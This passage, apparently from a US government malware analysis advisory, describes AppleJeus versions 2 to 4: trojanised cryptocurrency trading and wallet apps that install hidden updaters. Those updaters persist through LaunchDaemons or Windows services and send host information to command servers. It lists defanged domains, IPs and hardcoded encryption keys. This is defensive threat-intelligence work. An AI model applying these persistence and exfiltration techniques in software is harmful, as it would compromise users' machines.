	&lt;li&gt;Installs &lt;code&gt;JMTTrader&lt;/code&gt; in folder &lt;code&gt;/Applications/JMTTrader.app/Contents/MacOS/&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Installs &lt;code&gt;.CrashReporter&lt;/code&gt; in folder &lt;code&gt;/Applications/JMTTrader.app/Contents/Resources/&lt;/code&gt;
	&lt;ul&gt;
		&lt;li&gt;Note: the leading “.” makes it unlisted in the Finder app or default Terminal directory listing.&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;Executes a &lt;code&gt;postinstall&lt;/code&gt; script
	&lt;ul&gt;
		&lt;li&gt;Moves &lt;code&gt;.com.jmttrading.plist&lt;/code&gt; to folder &lt;code&gt;LaunchDaemons&lt;/code&gt;&lt;/li&gt;
		&lt;li&gt;Changes the file permissions on the &lt;code&gt;plist&lt;/code&gt;&lt;/li&gt;
		&lt;li&gt;Runs &lt;code&gt;CrashReporter&lt;/code&gt; with the &lt;code&gt;Maintain&lt;/code&gt; parameter&lt;/li&gt;
		&lt;li&gt;Moves &lt;code&gt;.CrashReporter&lt;/code&gt; to folder &lt;code&gt;/Library/JMTTrader/CrashReporter&lt;/code&gt;&lt;/li&gt;
		&lt;li&gt;Makes &lt;code&gt;.CrashReporter&lt;/code&gt; executable&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;code&gt;JMTTrader&lt;/code&gt; program asks for the user’s exchange and loads a legitimate-looking cryptocurrency trading platform—very similar to &lt;code&gt;CelasTradePro&lt;/code&gt; and the benign Q.T. Bitcoin Trader—that exhibits no signs of malicious activity.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;CrashReporter&lt;/code&gt; program checks for the &lt;code&gt;Maintain&lt;/code&gt; parameter and is not obfuscated. This lack of obfuscation makes it easier to determine the program’s functionality in detail. When it finds the &lt;code&gt;Maintain&lt;/code&gt; parameter, it collects the victim’s host information (&lt;em&gt;System Owner/User Discovery&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1033"&gt;T1033&lt;/a&gt;]), encrypts the collected information with a hardcoded XOR key before exfiltration, and sends the encrypted information to a C2 website (&lt;em&gt;Exfiltration Over C2 Channel &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1041"&gt;T1041&lt;/a&gt;]).&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;postinstall&lt;/code&gt; script has similar functionality to the one used by &lt;code&gt;CelasTradePro&lt;/code&gt;, but it has a few additional features (&lt;em&gt;Command and Scripting Interpreter: Unix Shell&lt;/em&gt;&amp;nbsp;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1059/004/"&gt;T1059.004&lt;/a&gt;]). It moves the property list (&lt;code&gt;&lt;tt&gt;plist&lt;/tt&gt;&lt;/code&gt;) file &lt;code&gt;.com.jmttrading.plis&lt;/code&gt;t from the Installer package to the &lt;code&gt;LaunchDaemons&lt;/code&gt; folder (&lt;em&gt;Scheduled Task/Job: Launchd &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1053/004/"&gt;T1053.004&lt;/a&gt;]), but also changes the file permissions on the &lt;code&gt;plist&lt;/code&gt; file. Once in the folder, this property list (&lt;code&gt;plist&lt;/code&gt;) file will launch the &lt;code&gt;CrashReporter&lt;/code&gt; program with the &lt;code&gt;Maintain&lt;/code&gt; parameter on system load as Root for every user. Also, the &lt;code&gt;postinstall&lt;/code&gt; script moves the &lt;code&gt;.CrashReporter&lt;/code&gt; program to a new location &lt;code&gt;/Library/JMTTrader/CrashReporter&lt;/code&gt; and makes it executable. Because the &lt;code&gt;LaunchDaemon&lt;/code&gt; will not run automatically after the &lt;code&gt;plist&lt;/code&gt; file is moved, the &lt;code&gt;postinstall&lt;/code&gt; script launches &lt;code&gt;CrashReporter&lt;/code&gt; with the &lt;code&gt;Maintain&lt;/code&gt; parameter and runs it in the background (&lt;em&gt;Create or Modify System Process: Launch Daemon&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1543/004/"&gt;T1543.004&lt;/a&gt;]).&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;&lt;em&gt;Payload&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Soon after the cybersecurity company tweeted about JMT Trader on October 11, 2019, the files on GitHub were updated to clean, non-malicious installers. Then on October 13, 2019, a different cybersecurity company published an article detailing the macOS X JMT Trader, and soon after, the C2 &lt;code&gt;beastgoc[.]com&lt;/code&gt; website went offline. There is not a confirmed sample of the payload to analyze at this point.&lt;/p&gt;

&lt;p&gt;For more details on AppleJeus Version 2: JMT Trading, see &lt;a href="https://us-cert.gov/ncas/analysis-reports/ar21-048b"&gt;MAR-10322463-2.v1&lt;/a&gt;.&lt;/p&gt;

&lt;h3 class="italic"&gt;AppleJeus Version 3: Union Crypto&lt;/h3&gt;

&lt;h4&gt;&lt;strong&gt;Introduction and Infrastructure&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;In December 2019, another version of the AppleJeus malware was identified on Twitter by a cybersecurity company based on many similarities to the original AppleJeus malware. Again, the malware was in the form of a cryptocurrency trading application, which was marketed and distributed by a legitimate-looking company, called Union Crypto, on their website, &lt;code&gt;unioncrypto[.]vip&lt;/code&gt; (&lt;em&gt;Acquire Infrastructure: Domain&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1583/001/"&gt;T1583.001&lt;/a&gt;]). Although this website is no longer available, a cybersecurity researcher discovered a download link, &lt;code&gt;https://www.unioncrypto[.]vip/download/W6c2dq8By7luMhCmya2v97YeN&lt;/code&gt;, recorded on VirusTotal for the macOS X version of &lt;code&gt;UnionCryptoTrader&lt;/code&gt;. In contrast, open-source reporting stated that the Windows version might have been downloaded via instant messaging service Telegram, as it was found in a “Telegram Downloads” folder on an unnamed victim.[&lt;a href="https://securelist.com/operation-applejeus-sequel/95596/"&gt;7&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;unioncrypto[.]vip&lt;/code&gt; domain resolved to the following IP addresses from June 5, 2019, to July 15, 2020.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;104.168.167[.]16&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;198.54.117[.]197&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;198.54.117[.]198&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;198.54.117[.]199&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;198.54.117[.]200&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The domain &lt;code&gt;unioncrypto[.]vip &lt;/code&gt;had a valid Sectigo SSL certificate (&lt;em&gt;Obtain Capabilities: Digital Certificates&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1588/004/"&gt;T1588.004&lt;/a&gt;]). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;Union Crypto Trader Application Analysis&lt;/strong&gt;&lt;/h4&gt;

&lt;h4&gt;&lt;strong&gt;&lt;em&gt;Windows Program&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;The Windows version of the malicious cryptocurrency application is a Windows executable (&lt;code&gt;.exe&lt;/code&gt;) (&lt;em&gt;User Execution: Malicious File&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1204/002"&gt;T1204.002&lt;/a&gt;]), which acts as an installer that extracts a temporary MSI Installer.&lt;/p&gt;

&lt;p&gt;The Windows program executes the following actions.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Extracts &lt;code&gt;UnionCryptoTrader.msi&lt;/code&gt; to folder &lt;code&gt;C:\Users\&amp;lt;username&amp;gt;\AppData\Local\Temp\{82E4B719-90F74BD1-9CF1-56CD777E0C42}&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Runs &lt;code&gt;UnionCryptoUpdater.msi&lt;/code&gt;
	&lt;ul&gt;
		&lt;li&gt;Installs &lt;code&gt;UnionCryptoTrader.exe&lt;/code&gt; in folder &lt;code&gt;C:\Program Files\UnionCryptoTrader&lt;/code&gt;&lt;/li&gt;
		&lt;li&gt;Installs &lt;code&gt;UnionCryptoUpdater.exe in folder C:\Users\&amp;lt;username&amp;gt;\AppData\Local\UnionCryptoTrader&lt;/code&gt;&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;Deletes &lt;code&gt;UnionCryptoUpdater.msi&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Runs &lt;code&gt;UnionCryptoUpdater.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The program &lt;code&gt;UnionCryptoTrader.exe&lt;/code&gt; loads a legitimate-looking cryptocurrency arbitrage application—defined as “the simultaneous buying and selling of securities, currency, or commodities in different markets or in derivative forms to take advantage of differing prices for the same asset”—which exhibits no signs of malicious activity. This application is very similar to another cryptocurrency arbitrage application known as Blackbird Bitcoin Arbitrage.[&lt;a href="https://github.com/butor/blackbird"&gt;8&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;The program &lt;code&gt;UnionCryptoUpdater.exe&lt;/code&gt; first installs itself as a service (&lt;em&gt;Create or Modify System Process: Windows Service&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1543/003"&gt;T1543.003&lt;/a&gt;]), which will automatically start when any user logs on (&lt;em&gt;Boot or Logon Autostart Execution&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1547/"&gt;T1547&lt;/a&gt;]). The service is installed with a description stating it “Automatically installs updates for Union Crypto Trader.” When launched, it collects the victim’s host information (&lt;em&gt;System Owner/User Discovery &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1033"&gt;T1033&lt;/a&gt;]), combines the information in a string that is MD5 hashed and stored in the &lt;code&gt;auth_signature&lt;/code&gt; variable before exfiltration, and sends it to a C2 website (&lt;em&gt;Exfiltration Over C2 Channel &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1041"&gt;T1041&lt;/a&gt;]).&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;&lt;em&gt;macOS X Program&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Installs &lt;code&gt;UnionCryptoTrader&lt;/code&gt; in folder &lt;code&gt;/Applications/UnionCryptoTrader.app/Contents/MacOS/&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Installs &lt;code&gt;.unioncryptoupdater&lt;/code&gt; in folder &lt;code&gt;/Applications/UnionCryptoTrader.app/Contents/Resources/&lt;/code&gt;
	&lt;ul&gt;
		&lt;li&gt;Note: the leading “.” makes it unlisted in the Finder app or default Terminal directory listing&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;Executes a &lt;code&gt;postinstall&lt;/code&gt; script
	&lt;ul&gt;
		&lt;li&gt;Moves &lt;code&gt;.vip.unioncrypto.plist&lt;/code&gt; to folder &lt;code&gt;LaunchDaemons&lt;/code&gt;&lt;/li&gt;
		&lt;li&gt;Changes the file permissions on the &lt;code&gt;plist&lt;/code&gt; to Root&lt;/li&gt;
		&lt;li&gt;Runs &lt;code&gt;unioncryptoupdater&lt;/code&gt;&lt;/li&gt;
		&lt;li&gt;Moves &lt;code&gt;.unioncryptoupdater&lt;/code&gt; to folder &lt;code&gt;/Library/UnionCrypto/unioncryptoupdater&lt;/code&gt;&lt;/li&gt;
		&lt;li&gt;Makes &lt;code&gt;.unioncryptoupdater&lt;/code&gt; executable&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;code&gt;UnionCryptoTrader&lt;/code&gt; program loads a legitimate-looking cryptocurrency arbitrage application, which exhibits no signs of malicious activity. The application is very similar to another cryptocurrency arbitrage application known as Blackbird Bitcoin Arbitrage.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;.unioncryptoupdater&lt;/code&gt; program is signed ad-hoc, meaning it is not signed with a valid code-signing identity. When launched, it collects the victim’s host information (&lt;em&gt;System Owner/User Discovery&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1033"&gt;T1033&lt;/a&gt;]), combines the information in a string that is MD5 hashed and stored in the &lt;code&gt;auth_signature&lt;/code&gt; variable before exfiltration, and sends it to a C2 website (&lt;em&gt;Exfiltration Over C2 Channel &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1041"&gt;T1041&lt;/a&gt;]).&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;postinstall&lt;/code&gt; script has similar functionality to the one used by JMT Trading (&lt;em&gt;Command and Scripting Interpreter: Unix Shell&lt;/em&gt;&amp;nbsp;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1059/004/"&gt;T1059.004&lt;/a&gt;]). It moves the property list (&lt;code&gt;plist&lt;/code&gt;) file &lt;code&gt;.vip.unioncrypto.plist&lt;/code&gt; from the Installer package to the &lt;code&gt;LaunchDaemons&lt;/code&gt; folder (&lt;em&gt;Scheduled Task/Job: Launchd&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1053/004/"&gt;T1053.004&lt;/a&gt;]), but also changes the file permissions on the &lt;code&gt;plist&lt;/code&gt; file to Root. Once in the folder, this property list (&lt;code&gt;plist&lt;/code&gt;) file will launch the &lt;code&gt;.unioncryptoupdater&lt;/code&gt; on system load as Root for every user. The &lt;code&gt;postinstall&lt;/code&gt; script moves the &lt;code&gt;.unioncryptoupdater&lt;/code&gt; program to a new location &lt;code&gt;/Library/UnionCrypto/unioncryptoupdater&lt;/code&gt; and makes it executable. Because the &lt;code&gt;LaunchDaemon&lt;/code&gt; will not run automatically after the &lt;code&gt;plist&lt;/code&gt; file is moved, the &lt;code&gt;postinstall&lt;/code&gt; script launches &lt;code&gt;.unioncryptoupdater&lt;/code&gt; and runs it in the background (&lt;em&gt;Create or Modify System&lt;/em&gt; &lt;em&gt;Process: Launch Daemon&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1543/004/"&gt;T1543.004&lt;/a&gt;]).&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;&lt;em&gt;Payload&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;The payload for the Windows malware is a Windows Dynamic-Link-Library.&amp;nbsp;&lt;code&gt;UnionCryptoUpdater.exe&lt;/code&gt; does not immediately download the stage 2 malware but instead downloads it after a time specified by the C2 server. This delay could be implemented to prevent researchers from directly obtaining the stage 2 malware.&lt;/p&gt;

&lt;p&gt;The macOS X malware’s payload could not be downloaded, as the C2 server is no longer accessible. Additionally, none of the open-source reporting for this sample contained copies of the macOS X payload. The macOS X payload is likely similar in functionality to the Windows stage 2 detailed above.&lt;/p&gt;

&lt;p&gt;For more details on AppleJeus Version 3: Union Crypto, see &lt;a href="https://us-cert.gov/ncas/analysis-reports/ar21-048c"&gt;MAR-10322463-3.v1&lt;/a&gt;.&lt;/p&gt;

&lt;h3 class="italic"&gt;Commonalities between Celas Trade Pro, JMT Trading, and Union Crypto&lt;/h3&gt;

&lt;h4&gt;&lt;strong&gt;Hardcoded Values&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;In each AppleJeus version, there are hardcoded values used for encryption or to create a signature when combined with the time (table 1).&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Table 1: AppleJeus hardcoded values and uses&lt;/em&gt;&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" style="width: 600px; height: 312px; margin-left: auto; margin-right: auto;"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col"&gt;&lt;strong&gt;AppleJeus Version &lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col"&gt;&lt;strong&gt;Value &lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col"&gt;&lt;strong&gt;Use &lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;1: Celas Trade Pro&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;Moz&amp;amp;Wie;#t/6T!2y&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;XOR encryption to send data&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;1: Celas Trade Pro&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;W29ab@ad%Df324V$Yd&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;RC4 decryption&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;2: JMT Trader Windows&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;X,%`PMk--Jj8s+6=15:20:11&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;XOR encryption to send data&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;2: JMT Trader OSX&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;X,%`PMk--Jj8s+6=\x02&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;XOR encryption to send data&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td class="text-align-center" scope="col"&gt;3: Union Crypto Trader&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;12GWAPCT1F0I1S14&lt;/td&gt;
			&lt;td class="text-align-center" scope="col"&gt;Combined with time for signature&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;The Union Crypto Trader and Celas LLC (XOR) values are 16 bytes in length. For JMT Trader, the first 16 bytes of the Windows and macOS X values are identical, and the additional bytes are in a time format for the Windows sample. The structure of a 16-byte value combined with the time is also used in Union Crypto Trader to create the &lt;code&gt;auth_signature&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;As mentioned, FALLCHILL was reported as the final payload for Celas Trade Pro. All FALLCHILL samples use 16-byte hardcoded RC4 keys for sending data, similar to the 16-byte keys in the AppleJeus samples.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;Open-Source Cryptocurrency Applications&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;All three AppleJeus samples are bundled with modified copies of legitimate cryptocurrency applications and can be used as originally designed to trade cryptocurrency. Both Celas LLC and JMT Trader modified the same cryptocurrency application, Q.T. Bitcoin Trader; Union Crypto Trader modified the Blackbird Bitcoin Arbitrage application.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;Postinstall Scripts, Property List Files, and LaunchDaemons&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;The macOS X samples of all three AppleJeus versions contain &lt;code&gt;postinstall&lt;/code&gt; scripts with similar logic. The Celas LLC &lt;code&gt;postinstall&lt;/code&gt; script only moves the &lt;code&gt;plist&lt;/code&gt; file to a new location and launches &lt;code&gt;Updater&lt;/code&gt; with the &lt;code&gt;CheckUpdate&lt;/code&gt; parameter in the background. The JMT Trader and Union Crypto Trader also perform these actions and have identical functionality. The additional actions performed by both &lt;code&gt;postinstall&lt;/code&gt; scripts are to change the file permissions on the &lt;code&gt;plist&lt;/code&gt;, make a new directory in the &lt;code&gt;/Library&lt;/code&gt; folder, move &lt;code&gt;CrashReporter&lt;/code&gt; or &lt;code&gt;UnionCryptoUpdater&lt;/code&gt; to the newly created folder, and make them executable.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;plist&lt;/code&gt; files for all three AppleJeus files have identical functionality. They only differ in the files’ names and one default comment that was not removed from the Celas LLC &lt;code&gt;plist&lt;/code&gt;. As the logic and functionality of the postinstall scripts and plist files are almost identical, the &lt;code&gt;LaunchDaemons&lt;/code&gt; created also function the same.&lt;/p&gt;

&lt;p&gt;They will all launch the secondary executable as Root on system load for every user.&lt;/p&gt;

&lt;h3 class="italic"&gt;AppleJeus Version 4: Kupay Wallet&lt;/h3&gt;

&lt;h4&gt;&lt;strong&gt;Introduction and Infrastructure&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;On March 13, 2020, a new version of the AppleJeus malware was identified. The malware was marketed and distributed by a legitimate-looking company, called Kupay Wallet, on their website &lt;code&gt;kupaywallet[.]com&lt;/code&gt; (&lt;em&gt;Acquire Infrastructure: Domain&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1583/001/"&gt;T1583.001&lt;/a&gt;]).&lt;/p&gt;

&lt;p&gt;The domain &lt;code&gt;www.kupaywallet[.]com&lt;/code&gt; resolved to IP address &lt;code&gt;104.200.67[.]96&lt;/code&gt; from March 20, 2020, to January 16, 2021. CrownCloud US, LLC controlled the IP address (autonomous system number [ASN] 8100), and is located in New York, NY.&lt;/p&gt;

&lt;p&gt;The domain &lt;code&gt;www.kupaywallet[.]com&lt;/code&gt; had a valid Sectigo SSL certificate (&lt;em&gt;Obtain Capabilities: Digital Certificates&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1588/004/"&gt;T1588.004&lt;/a&gt;]). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;Kupay Wallet Application Analysis&lt;/strong&gt;&lt;/h4&gt;

&lt;h4&gt;&lt;em&gt;Windows Program&lt;/em&gt;&lt;/h4&gt;

&lt;p&gt;The Windows version of the malicious cryptocurrency application is an MSI Installer. The MSI executes the following actions.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Installs &lt;code&gt;Kupay.exe&lt;/code&gt; in folder &lt;code&gt;C:\Program Files (x86)\Kupay&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Installs &lt;code&gt;KupayUpgrade.exe&lt;/code&gt; in folder &lt;code&gt;C:\Users\&amp;lt;username&amp;gt;\AppData\Roaming\KupaySupport&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Runs &lt;code&gt;KupayUpgrade.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The program &lt;code&gt;Kupay.exe&lt;/code&gt; loads a legitimate-looking cryptocurrency wallet platform, which exhibits no signs of malicious activity and is very similar to an open-source platform known as Copay, distributed by Atlanta-based company BitPay.&lt;/p&gt;

&lt;p&gt;The program &lt;code&gt;KupayUpgrade.exe&lt;/code&gt; first installs itself as a service (&lt;em&gt;Create or Modify System Process:&lt;/em&gt; &lt;em&gt;Windows Service&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1543/003"&gt;T1543.003&lt;/a&gt;]), which will automatically start when any user logs on (&lt;em&gt;Boot or Logon&lt;/em&gt; &lt;em&gt;Autostart Execution&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1547/"&gt;T1547&lt;/a&gt;]). The service is installed with a description stating it is an “Automatic Kupay Upgrade.” When launched, it collects the victim’s host information (&lt;em&gt;System Owner/User Discovery&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1033"&gt;T1033&lt;/a&gt;]), combines the information in strings before exfiltration, and sends it to a C2 website (&lt;em&gt;Exfiltration Over C2&lt;/em&gt; &lt;em&gt;Channel&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1041"&gt;T1041&lt;/a&gt;]).&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;&lt;em&gt;macOS X Program&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Installs &lt;code&gt;Kupay&lt;/code&gt; in folder &lt;code&gt;/Applications/Kupay.app/Contents/MacOS/&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Installs &lt;code&gt;kupay_upgrade&lt;/code&gt; in folder &lt;code&gt;/Applications/Kupay.app/Contents/MacOS/&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Executes a &lt;code&gt;postinstall&lt;/code&gt; script
	&lt;ul&gt;
		&lt;li&gt;Creates &lt;code&gt;KupayDaemon&lt;/code&gt; folder in &lt;code&gt;/Library/Application Support&lt;/code&gt; folder&lt;/li&gt;
		&lt;li&gt;Moves &lt;code&gt;kupay_upgrade&lt;/code&gt; to the new folder&lt;/li&gt;
		&lt;li&gt;Moves &lt;code&gt;com.kupay.pkg.wallet.plist&lt;/code&gt; to folder &lt;code&gt;/Library/LaunchDaemons/&lt;/code&gt;&lt;/li&gt;
		&lt;li&gt;Runs the command &lt;code&gt;launchctl load&lt;/code&gt; to load the &lt;code&gt;plist&lt;/code&gt; without a restart&lt;/li&gt;
		&lt;li&gt;Runs &lt;code&gt;kupay_upgrade&lt;/code&gt; in the background&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;Kupay&lt;/code&gt; is likely a copy of an open-source cryptocurrency wallet application, loads a legitimate-looking wallet program (fully functional), and its functionality is identical to the Windows &lt;code&gt;Kupay.exe&lt;/code&gt; program.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;kupay_upgrade&lt;/code&gt; program calls its function &lt;code&gt;CheckUpdate&lt;/code&gt; (which contains most of the logic functionality of the malware) and sends a &lt;code&gt;POST&lt;/code&gt; to the C2 server with a connection named “Kupay Wallet 9.0.1 (Check Update Osx)” (&lt;em&gt;Application Layer Protocol: Web Protocols&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1071/001"&gt;T1071.001&lt;/a&gt;]). If the C2 server returns a file, it is decoded and written to the victim’s folder &lt;code&gt;/private/tmp/kupay_update&lt;/code&gt; with permissions set by the command &lt;code&gt;chmod 700&lt;/code&gt; (only the user can read, write, and execute) (&lt;em&gt;Command and Scripting Interpreter&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1059/"&gt;T1059&lt;/a&gt;]). Stage 2 is then launched, and the malware, &lt;code&gt;kupay_upgrade&lt;/code&gt;, returns to sleeping and checking in with the C2 server at predetermined intervals (&lt;em&gt;Application Layer Protocol: Web Protocols&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1071/001"&gt;T1071.001&lt;/a&gt;]).&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;postinstall&lt;/code&gt; script has similar functionality to other AppleJeus scripts (&lt;em&gt;Command and Scripting Interpreter: Unix Shell&lt;/em&gt;&amp;nbsp;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1059/004/"&gt;T1059.004&lt;/a&gt;]). It creates the &lt;code&gt;KupayDaemon&lt;/code&gt; folder in &lt;code&gt;/Library/Application&lt;/code&gt; Support folder and then moves &lt;code&gt;kupay_upgrade&lt;/code&gt; to the new folder. It moves the property list (&lt;code&gt;plist&lt;/code&gt;) file &lt;code&gt;com.kupay.pkg.wallet.plist&lt;/code&gt; from the Installer package to the &lt;code&gt;/Library/LaunchDaemons/&lt;/code&gt; folder (&lt;em&gt;Scheduled Task/Job: Launchd &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1053/004/"&gt;T1053.004&lt;/a&gt;]). The script runs the command &lt;code&gt;launchctl load&lt;/code&gt; to load the &lt;code&gt;plist&lt;/code&gt; without a restart (&lt;em&gt;Command and Scripting Interpreter &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1059/"&gt;T1059&lt;/a&gt;]). But, since the LaunchDaemon will not run automatically after the &lt;code&gt;plist&lt;/code&gt; file is moved, the &lt;code&gt;postinstall&lt;/code&gt; script launches &lt;code&gt;kupay_upgrade&lt;/code&gt; and runs it in the background (&lt;em&gt;Create or Modify System Process: Launch Daemon &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1543/004/"&gt;T1543.004&lt;/a&gt;]).&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;&lt;em&gt;Payload&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;The Windows malware’s payload could not be downloaded since the C2 server is no longer accessible. Additionally, none of the open-source reporting for this sample contained copies of the payload. The Windows payload is likely similar in functionality to the macOS X stage 2 detailed below.&lt;/p&gt;

&lt;p&gt;The stage 2 payload for the macOS X malware was decoded and analyzed. The stage 2 malware has a variety of functionalities. Most importantly, it checks in with a C2 and, after connecting to the C2, can send or receive a payload, read and write files, execute commands via the terminal, etc.&lt;/p&gt;

&lt;p&gt;For more details on AppleJeus Version 4: Kupay Wallet, see &lt;a href="https://us-cert.gov/ncas/analysis-reports/ar21-048d"&gt;MAR-10322463-4.v1&lt;/a&gt;.&lt;/p&gt;

&lt;h3 class="italic"&gt;AppleJeus Version 5: CoinGoTrade&lt;/h3&gt;

